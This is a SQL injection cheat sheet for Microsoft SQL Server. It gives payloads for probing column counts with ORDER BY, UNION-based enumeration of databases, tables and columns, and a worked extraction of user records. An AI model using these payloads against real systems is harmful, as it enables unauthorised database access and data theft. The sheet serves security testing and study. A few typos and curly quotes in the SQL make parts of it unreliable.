# MSSQL Injection

## Summary

* [MSSQL comments](#mssql-comments)
* [MSSQL Current User](#mssql-User)
* [MSSQL version](#mssql-version)
* [MSSQL database name](#mssql-database-name)
* [MSSQL List databases](#mssql-list-databases)
* [MSSQL List columns](#mssql-list-columns)
* [MSSQL List tables union](#mssql-list-tables)
* [MSSQL Union Based](#mssql-union-based)


## MSSQL comments

```sql

/*	    C-style comment
--	    SQL comment
;%00	    Nullbyte
```
--------------------------------------------------------------------------------------------------------

## MSSQL User

```sql
SELECT CURRENT_USER
```
--------------------------------------------------------------------------------------------------------

## MSSQL version

```sql
SELECT @@version
---------------------------------------------------------
Example:
True if MSSQL version is 2008.
SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';
Note:

Output will also contain the version of the Windows Operating System.
```
--------------------------------------------------------------------------------------------------------

## MSSQL database name

```sql
SELECT DB_NAME()
---------------------------------------------------------
Database.Table	master..sysdatabases
Column	        name
Current DB	    DB_NAME(i)
```
--------------------------------------------------------------------------------------------------------

## MSSQL List databases

```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
---------------------------------------------------------
pubs	            Not available on MSSQL 2005
model	            Available in all versions
msdb	            Available in all versions
tempdb	            Available in all versions
northwind	        Available in all versions
information_schema	Availalble from MSSQL 2000 and hig
```
--------------------------------------------------------------------------------------------------------

## MSSQL List columns

```sql
ORDER BY n+1;
---------------------------------------------------------
Given the query: SELECT username, password, permission FROM Users WHERE id = '1';

1' ORDER BY 1--	True
1' ORDER BY 2--	True
1' ORDER BY 3--	True
1' ORDER BY 4--	False - Query is only using 3 columns

Note:
Keep incrementing the number until you get a False response.
Retrieving Columns:-

(We can retrieve the columns from two different databases, information_schema.columns or masters..syscolumns.)

UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')
```
--------------------------------------------------------------------------------------------------------

## MSSQL List tables 

```sql

SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns

Retrieving Tables:-
UNION SELECT name FROM master..sysobjects WHERE xtype='U'       FOR UNION base Attack

Note:
Xtype = 'U' is for User-defined tables. You can use 'V' for views.

```
--------------------------------------------------------------------------------------------------------

## MSSQL Union Based

```sql
-- extract databases names
$ SELECT name FROM master..sysdatabases
[*] Injection
[*] msdb
[*] tempdb

-- extract tables from Injection database
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users

-- extract columns for the table Users
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName

-- Finally extract the data
$ SELECT  UserId, UserName from Users
```

